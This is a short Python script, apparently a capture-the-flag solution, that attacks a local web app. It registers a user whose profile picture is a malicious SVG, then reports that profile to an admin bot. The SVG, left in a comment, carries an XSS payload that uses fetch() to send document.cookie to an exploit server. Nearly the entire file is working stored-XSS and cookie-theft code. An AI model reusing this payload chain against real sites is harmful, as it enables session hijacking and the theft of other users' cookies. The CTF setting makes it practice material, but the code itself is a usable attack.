import requests
import base64

# exploit_server_url = "http://localhost:5001"

# svg_vuln = f'<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">fetch("{exploit_server_url}?flag=" + document.cookie)</script></svg>'

# HOST THE SVG ON INTERNET or python -m http.server 5002
server_url = "http://localhost:5000"

# svg_vuln = base64.b64encode(svg_vuln.encode()).decode()

# print(svg_vuln)

username = "fadaganteng"

# url = f"{server_url}/register"
# data = {
#     "username": username,
#     "password": "ganteng",
#     "profile_pic_url": f"http://localhost:3000/vuln_img.svg" # svg_vuln URL
# }
# response = requests.post(url, data=data)
# print(response.text)

print("=====================================")
# report
url = f"{server_url}/report"
data = {
    "url": f"{server_url}/profile/{username}"
}
response = requests.post(url, data=data)
print(response.text)
print(f"Visit {server_url}/profile/{username} to see the report")
